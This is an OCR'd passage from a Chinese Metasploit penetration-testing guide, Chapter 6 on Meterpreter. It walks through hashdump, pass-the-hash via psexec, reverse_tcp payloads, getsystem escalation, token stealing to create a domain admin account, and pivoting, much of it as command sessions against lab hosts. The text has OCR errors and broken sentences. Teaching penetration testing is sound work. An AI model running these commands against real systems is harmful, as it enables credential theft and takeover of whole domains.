哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，
而不是原始的14个字符。而NTLM的存储方式跟密码长度无关，密码password123456将作为
82
---
## Page 110
第6章Meterpreter
整体转换为哈希值存储。
提示：我们在这里使用一个无法在短期内破解的超级复杂的密码。比LM所支持的最大
14个字符更长的密码，这样系统会将其自动转换为NTLM的哈希存储方式。即使用彩虹表或
超级计算机也无法在可接受的时间内对其进行破解。
如下内容是我们提取的UID为500的Administrator用户账号的密码哈希值（Windows
系统默认管理员为Administrator）。Administrator:50o后的字串是Administrator密码的两个
哈希值。
Administrator:500:e52cac67419a9a22cbb699e2fdfcc59e 0 :30ef086423f916deec378aac42c4ef0c @:::
第一个哈希O是LM哈希值，第二个则是NTLM哈希值?。
接下来我们将从自已的WindowsXP系统上提取用户名和密码哈希值。
6.2.2使用Meterpreter命令获取密码哈希值
在目标系统上重置一个复杂的密码，如thisisacrazylongpassword&&!!@@##，然后使用
Meterpreter重新获取目标系统上的用户名和密码哈希值（见之前的代码）。我们使用usepriv命
令，意味着运行在特权账号上。
获取安全账号管理器（SAM）数据库，我们需要运行在SYSTEM权限下，以绕过注册表
的限制，获取受保护的存有Windows用户和密码的SAM存储。请尝试在实验虚拟机上执行这
个场景，来看看你是否能提取到用户名和密码哈希值。下面的过程演示了我们使用hashdump
命令获取系统所有的用户名和密码哈希值。
meterpreter > use priv
Loading extension priv...success.
[*] Obtaining the boot key...
[*]CalculatingthehbootkeyusingSYSKEY8528c78df7ff55040196a9b670f114b6..
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::
Administrator:500:NOPASSWD:ntlm哈希也为空一样）。由于密码超过14字节的长度，Windows
83
---
## Page 111
Metasploit渗透测试指南
不能将其存储为LM形式，所以存储为aad3b435..的字串，代表空的密码。
LM哈希值的问题
有兴趣的话，可以这样试一下：将密码重置为复杂的14个字符长或更短的密码，
使用hashdump提取密码哈希值复制第一个LM的哈希值（在上例中以aad3b435开头
的字串），然后搜索在线的密码破解页面提交你的哈希值。等待几分钟，就可以获得你
破解后的密码（注意不要使用你真实的密码，因为这些信息可被任意访问这个页面的
人获得！）。这就是彩虹表破解，彩虹表是哈希值和与之对应的明文密码组的巨大表
单，通常用作密码破解。彩虹表可以是字符09、a-Z、特殊字符和空格的任意组合。
当把哈希提交到在线页面进行破解的时候，页面的后台服务将从以十亿计的彩虹表中
搜索你的哈希值所对应的密码明文。
6.3传递哈希值
在前面的例子中，我们遭遇了一点小麻烦：我们已经提取到管理员用户的用户名和密码哈
希值，但我们不能在可接受时间内将明文密码破解出来。如果不知道明文密码，如何通过这个
用户账号登录到更多的主机，入侵更多的系统呢？
这里将用到哈希值传递技术，仅仅有密码的哈希值就够了，而不需要密码明文。用Metasploit
的windows/smb/psexec模块就可以实现，如下所示：
msf>use windows/smb/psexec 0
payload => windows/meterpreter/reverse_tcp
msfexploit(psexec)>setLH0ST192.168.33.129
LHOST => 192.168.33.129
msf exploit(psexec)>set LPoRT 443
LPORT => 443
msf exploit(psexec)>setRH0ST 192.168.33.130
RHOST => 192.168.33.130
·.SNIP.·
msfexploit(psexec)>set SMBPass
SMBPass=>aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625
msf exploit(psexec)>exploit
[*]Connecting totheserver...
[*]Started reversehandler
[*]Authenticating as user'Administrator'...
84
---
## Page 112
第6章Meterpreter
[*] Uploading payload...
[*]Created\JsOvAFLy.exe..
选择smb/psexec模块O，设置好LHOST、LPORT和RHOST等参数之后，将SMBPass变
量设置为先前获得的密码哈希值?。可以看到认证通过了，我们获得了Meterpreter会话。这里
我们没有破解密码，也不需要明文密码，仅仅使用密码哈希值就获得了管理员权限。
如果成功入侵了某大型网络中的一台主机，在多数情况下，这台主机的管理员账号与域中
其他大部分系统的应该一样。这样我们就可以无须破解密码，就能够实现从一个节点到另一个
节点的攻击。
6.4权限提升
现在我们获得了目标系统的访问权限，可以通过netuser命令创建限制权限的普通用户账
号。我们将示例讲解如何创建新的用户并对其权限进行提升（你可以在第8章中学习更多这方
面的知识）。
如果以受限用户账号登入，将会被限制执行需要管理员权限的一些命令，对账号进行提权
可以克服这类问题。
在WindowsXP的目标机上输入以下命令：
C:\DocumentsandSettings\Administrator>netuserbobpassword123/add.
然后，我们创建一个基于Meterpreter的攻击载荷程序--payload.exe，复制到目标XP机
上，并在bob用户账户下运行，这是我们新建立的受限用户账号。在这个实例中，我们使用攻
击载荷生成器（msfpayload）来创建以普通Windows可执行文件格式的Meterpreter攻击载荷程
序payload.exe。（在第7章中我们将会讨论msfpayload的更多细节）
LHOST=192.168.33.129LPORT=443X>payload.exe0
root@bt:/opt/framework3/msf3# msfcli multi/handler PAYLoAD=windows/meterpreter/reverse_tcp
LH0ST=192.168.33.129LP0RT=443E②
[*]Please wait while we loadthe module tree...
[*]Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*]Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1056)
meterpreter>getuid③
Serverusername:IHAZSECURITY\bob
85
---
## Page 113
Metasploit渗透测试指南
创建Meterpreter攻击载荷时，我们所设置的LHOST和LPORT参数指示了反向shell连接
到攻击机地址和端口443。随后我们调用msfcli接口进行监听并等待连接，当有连接到达的时
候，将会开启Meterpreter的shell。
在攻击机上创建Meterpreter可执行程序O，复制到Windows XP机上，然后以bob用户
运行。
我们?设置监听以接收Meterpreter连接，然后在目标系统上执行payload.exe，得到一个受
限用户的Meterpreter 控制台③。例如，我们可以在Back|Track机上生成payload.exe，拷贝到
WindowsXP机上，然后设置监听以获得Meterpreter会话。
meterpreter>shell0
Process 2896 created.
Channel 1 created.
MicrosoftWindowsXP[Version5.1.26o0]
(C)Copyright1985-2001 MicrosoftCorp.
C:\>net user bob
...SnIp...
Local Group Memberships
*Users
Global Group memberships
*None
The command completed successfully.
C:1>^Z
Background channel 1?[y/N]y
在上面显示的过程中，我们用Meterpreter会话进入到shellO，输入netuserbob，可以看
到bob用户在Users的组里面，不是管理员，只拥有受限的权限。在这个账户环境下，我们的
希值（幸运的是，Meterpreter可以克服这样的困难，等下你就可以看到）。查询完毕后，按CTRL-Z
键退出shell并保留Meterpreter会话。
提示：Meterpreter使用小窍门一一在Meterpreter控制台里的时候，可以输入background
跳转到MSF终端里，Meterpreter的会话仍在运行。然后输入sessions-1和sessions-i会话id
可返回到Meterpreter控制台。
现在让我们来获取管理员或SYSTEM权限。如下所示，我们输入usepriv命令来加载priv
扩展，以便访问某些特权模块（这些模块可能已经加载）。然后输入getsystem命令尝试将权限
提升到本地系统权限或管理员权限。可以输入getuid命令来检查获取的权限等级。服务端用户
名返回的是NTAUTHORITYLSYSTEM，这意味着我们成功获得了管理员权限。
86
---
## Page 114
第6章Meterpreter
meterpreter>use priv
Loadingextensionpriv...success.
meterpreter>getsystem
...got system (via technique 4).
meterpreter> getuid
ServerUsername:NTAUTHORITY\SYSTEM
我们可以使用rev2setf命令，切换回Meterpretershell会话中的初始用户账号。
6.5令牌假冒
在令牌假冒攻击中，我们将搜取目标系统中的一个Kerberos令牌，将其用在身份认证环节，
来假冒当初创建这个令牌的用户。令牌假冒是Meterpreter最强大的功能之一，对渗透测试非常
有帮助。
设想以下的场景，比方说：你正在对某个组织进行渗透测试，成功地入侵了系统并建立了
一个Meterpreter的终端，而域管理员用户在13小时内登录过这台机器。在该用户登入这台机
内有效。你可以使用这个活动令牌来入侵系统，通过Meterpreter你可以假冒成域管理员的角色，
而不需要破解他的密码，然后你就可以去攻击域管理员账号，甚至是域控制器。这可能是获取
系统访问最简便的方法，也是体现Meterpreter实用性的另一个例子。
6.6使用ps
在这个例子中，我们使用Meterpreter的ps 命令列举当前运行的应用程序以及运行这些应
用的用户账号。我们所在域的名字是SNEAKS.INO，域管理员用户名为ihazdomainadmin?。
meterpreter>ps
Process list
PID
Name
Arch Session User
Path
0
[System Process]
4
System
x86
。
NTAUTHORITY\SYSTEM
380
cmd.exe
x86
OSNEAKS.IN\ihazdomainadmin@
\System\
Root\System32\cmd.exe
.·.SNIP...
meterpreter>
87
---
## Page 115
Metaspioit渗透测试指南
如下所示，我们使用stealtoken命令和PID参数（这里是380）来盗取域管理员用户的
令牌。
meterpreter>steal_token 380
Stolen token with username:SNEAKS.IN\ihazdomainadmin
meterpreter>
我们已经成功地假冒了域管理员账号，现在Meterpreter是以域管理员用户来运行了。
某些情况下ps命令不能列出域管理员运行的进程。我们可以使用incognito命令列举出系统
上可以利用的令牌。因为结果可能不同，渗透测试时需要同时检查ps命令和incogmito命令的输
出结果。
通过useincognito命令加载incognito模块，然后通过list_token-u命令列举出令牌。在①
可以看到SNEAKS.INihazdomainadmin用户账号。现在我们可以假冒别的用户了。
meterpreter>use incognito
Loading extension incognito...success.
meterpreter>list_tokens-u
[-]Warning:Not currently running as SYSTEM,not all tokens will be available
Call rev2self if primary process token is SYSTEM
DelegationTokens Available
SNEAKS.IN\ihazdomainadmin0
IHAZSECURITY\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NTAUTHORITY\SYSTEM
Impersonation Tokens Available
NTAUTHORITY\ANONYMOUSLOGON
如下所示，我们成功扮演了ihazdomainadmin令牌①并添加了一个新的用户9，然后给它赋
予了域管理员的权限③。（在O输入DOMAIN\USERNAME的时候需要输入两个反斜杠，II)
域控制器为192.168.33.50。
meterpreter>impersonate_tokenSNEAKS.IN\\ihazdomainadmin0
[+]Delegationtoken available
[+]Successfullyimpersonated user SNEAKS.IN\ihazdomainadmin
meterpreter > add_user omgcompromised p@55w0rd! -h 192.168.33.50 @
[*] Attempting to add user omgcompromised to host 192.168.33.50
[+] Successfully added user
[*]
Attempting to add user omgcompromised to group Domain Admins on domain controller
192.168.33.50
[+] Successfully added user to group
88
---
## Page 116
第6章Meterpreter
在输入add_user和add_group_user命令时，请确保指定了-h参数，这个参数是域管理员
账号添加到的目的地址。在这里是域控制器的IP地址。这种攻击无疑极具破坏性：从原理上来
说，域管理员登录到任何系统上的Kerberos令牌，都可以被假冒，以达到访问整个域的目的，
这也意味着网络上任何一台机器都是薄弱环节。
6.7通过跳板攻击其他机器
跳板攻击（Pivoting）是Meterpreter提供的-一种攻击方法，允许从Meterpreter终端攻击网
作为跳板攻击网络中的其他系统，或者访问由于路由问题而不能直接访问的内网系统。
举个例子，假如你现在从互联网上实施渗透测试，通过某个漏洞入侵了一个系统，并在内
部网络中取得了Meterpreter终端。但这个系统上并没有你想要的所有东西，然而你也不能直接
Meterpreter终端来攻击内部网络中的其他机器。
在下面的例子中，我们将从一个子网攻击一个目标系统，然后通过这个系统建立路由去攻
击其他机器。首先，我们尝试对WindowsXP机器进行漏洞攻击，成功后以此为据点，再对内
部网络的一个Ubuntu系统进行攻击。攻击机的IP是10.10.1.1/24中的地址，目标是
192.168.33.1/24的网络。
我们假设通过入侵已经获得了某个服务器的访问权限，所以关注的是如何与目标网络建立
连接。我们将使用在scripts/meterpreter/目录中的Meterpreter外部脚本，这些脚本提供了可以在
Meterpreter中使用的额外功能。
meterpreter > run get_local_subnets 0
Local subnet: 192.168.33.0/255.255.255.0
meterpreter>background
msf exploit(handler) > route add 192.168.33.0 255.255.255.0 1 
msfexploit(handler)>routeprint①
ActiveRoutingTable
Subnet
Netmask
Gateway
=